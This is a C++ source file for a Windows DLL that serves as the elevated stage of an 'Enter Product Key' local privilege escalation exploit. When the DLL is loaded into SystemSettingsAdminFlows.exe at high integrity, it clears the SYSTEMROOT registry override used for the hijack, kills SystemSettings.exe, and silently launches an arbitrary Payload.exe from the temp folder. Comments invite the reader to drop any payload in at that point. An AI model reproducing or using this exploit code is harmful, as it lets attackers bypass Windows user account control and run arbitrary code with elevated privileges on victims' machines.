#include <string>
#include <Windows.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
using namespace std;

#pragma comment(lib, "shlwapi.lib")

void KillSystemSettingsProcess();
void DeleteRegistryValue(HKEY key, wstring path, wstring name);
wstring GetTempFolderPath();

bool WINAPI DllMain(HINSTANCE hInstDll, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		// We now run in SystemSettingsAdminFlows.exe with high IL. This is the "Enter Product Key" of the Settings app

		// Restore %SYSTEMROOT% immediately
		DeleteRegistryValue(HKEY_CURRENT_USER, L"Volatile Environment", L"SYSTEMROOT");

		// Clean up SystemSettings.exe processes. Sorry for all the visual disturbance, @user
		KillSystemSettingsProcess();

		// Execute Payload.exe
		// Basically, any payload can be implemented from here on and it doesn't necessarily have to be a separate executable
		// If you can guarantee stability within *this* context, you can also just write down your payload here...
		CreateProcessW((GetTempFolderPath() + L"\\EnterProductKeyVolatileEnvironmentLPE\\Payload.exe").c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &STARTUPINFOW(), &PROCESS_INFORMATION());

		// Job done, leaving...
		ExitProcess(0);
	}

	return true;
}



void KillSystemSettingsProcess()
{
	DWORD processId = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	if (Process32FirstW(snapshot, &process))
	{
		do
		{
			if (StrCmpW(process.szExeFile, L"SystemSettings.exe") == 0)
			{
				BOOL result = TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, process.th32ProcessID), 0);
			}
		}
		while (Process32NextW(snapshot, &process));
	}

	CloseHandle(snapshot);
}
void DeleteRegistryValue(HKEY key, wstring path, wstring name)
{
	HKEY hKey;

	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegDeleteValueW(hKey, name.c_str());
		RegCloseKey(hKey);
	}
}
wstring GetTempFolderPath()
{
	wchar_t path[MAX_PATH];
	GetTempPathW(MAX_PATH, path);
	return wstring(path);
}